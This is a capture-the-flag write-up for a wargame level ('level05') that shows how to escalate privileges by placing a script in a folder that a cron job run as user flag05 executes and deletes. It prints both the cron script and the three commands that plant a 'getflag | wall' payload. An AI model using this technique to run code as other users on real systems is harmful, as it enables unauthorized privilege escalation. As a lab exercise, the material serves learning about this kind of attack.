## level05

There is nothing in the home folder. Luckily, during the exploration of the VM during the first exercise, we found the folder `/var/mail` which contains what looks like a cron job for user `flag05`: `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`.

```shell
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```
This script finds all the files found in `/opt/openarenaserver/*`, executes them, and removes them.
```shell
echo '#!/bin/sh' > /opt/openarenaserver/lol.sh
echo 'getflag | wall' >> /opt/openarenaserver/lol.sh
chmod +x /opt/openarenaserver/lol.sh
```